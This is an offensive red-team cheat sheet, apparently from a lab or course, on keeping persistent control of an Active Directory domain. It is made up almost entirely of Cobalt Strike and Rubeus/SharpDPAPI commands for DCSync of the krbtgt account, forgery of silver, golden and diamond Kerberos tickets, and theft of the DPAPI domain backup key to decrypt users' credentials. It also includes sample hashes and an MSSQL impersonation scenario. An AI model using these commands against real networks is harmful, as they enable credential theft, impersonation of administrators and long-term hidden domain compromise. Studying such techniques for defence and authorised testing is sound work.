# Domain Persistence

## DCSync

```shell
beacon> dcsync contoso.com CONTOSO\krbtgt
```
> Try to do this from DC only

## Ticket Forgery

```shell
# Sacrificial session
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x
beacon> rev2self
```
### Silver Tickets

```shell
# /service is the target service.
# /aes256 is the AES256 hash of the target computer account.
# /user is the username to impersonate.
# /domain is the FQDN of the computer's domain.
# /sid is the domain SID.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256: /user:Administrator /domain:DOMAIN.COM /sid: /nowrap
```

- Consider a scenario where you obtain the plaintext password of a domain account running an MSSQL service.  That service account may not have sysadmin privileges on the database instance (which is default), so the service account is not directly useful in gaining access to the underlying database.  However, you can use the service's secret to forge a service ticket for the MSSQL service, impersonating a user you know to be a sysadmin.

```shell
# Convert plaintext password into hash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

# Create silver ticket
# /id is the RID for $USER.
# /groups are the RIDs of $USER's group membership.  513 is 'Domain Users', 1106 is 'Workstation Admins', 1107 is 'Server Admins', and 4602 is 'Database Admins'.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:$USER /id:$USER_ID /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

### Golden Tickets

```shell
# /aes256 is the AES256 hash for the krbtgt account.
# /user is the username to impersonate.
# /domain is the current domain.
# /sid is the current domain's SID
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

### Diamond Tickets (OPSEC Safe IMO)

```shell
# /tgtdeleg uses the TGT delegation trick to obtain a usable TGT for the current user without needing credentials.
# /krbkey is the krbtgt's AES256 hash.
# /ticketuser is the user we want to impersonate.
# /ticketuserid is the impersonated user's RID.
# /domain is the current domain.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```

### DPAPI Backup Key

```shell
# Fetch domain backup key
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

# Get user's DPAPI creds
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:$DOMAIN_MASTER_KEY
```